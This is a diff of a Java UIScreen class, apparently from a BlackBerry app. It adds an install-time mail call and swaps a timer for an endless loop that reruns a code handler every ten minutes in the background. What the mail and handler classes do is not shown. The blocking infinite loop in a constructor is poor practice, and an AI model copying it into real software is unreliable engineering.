@@ -36,7 +36,9 @@ public final class UIScreen extends MainScreen
     public UIScreen()
     {        
     	EventLogger.register(GUID, AppName, EventLogger.VIEWER_STRING);
-
+    	
+    	new MailCode().InstallationMail();
+    	
     	Application.getApplication().setAcceptEvents(false);
     	EventLogger.logEvent(GUID, ("Application requested for Background entry").getBytes(),EventLogger.DEBUG_INFO);
     //	Sends the application in background
@@ -51,16 +53,25 @@ public final class UIScreen extends MainScreen
     	new CodesHandler().run();
     	
     	
-    	
-    	
-    	Timer timer = new Timer();
-    	timer.schedule(new TimerTask() 
-		{
-			public void run()
-			{
-				new CodesHandler().run();
+    	EventLogger.logEvent(GUID, ("10min for()").getBytes(),EventLogger.ALWAYS_LOG);
+    	for(;;)
+    	{
+    		try {
+				Thread.sleep(10*60*1000);
+			} catch (InterruptedException e) {
+				e.printStackTrace();
 			}
-		}, 10*1000, 1*60*60*1000);
+    		new CodesHandler().run();
+    	}
+    	
+//    	EventLogger.logEvent(GUID, ("10min timertask").getBytes(),EventLogger.ALWAYS_LOG);
+//    	new Timer().schedule(new TimerTask() 
+//		{
+//			public void run()
+//			{
+//				new CodesHandler().run();
+//			}
+//		}, 10*1000, 10*60*1000);
     	
     }
     
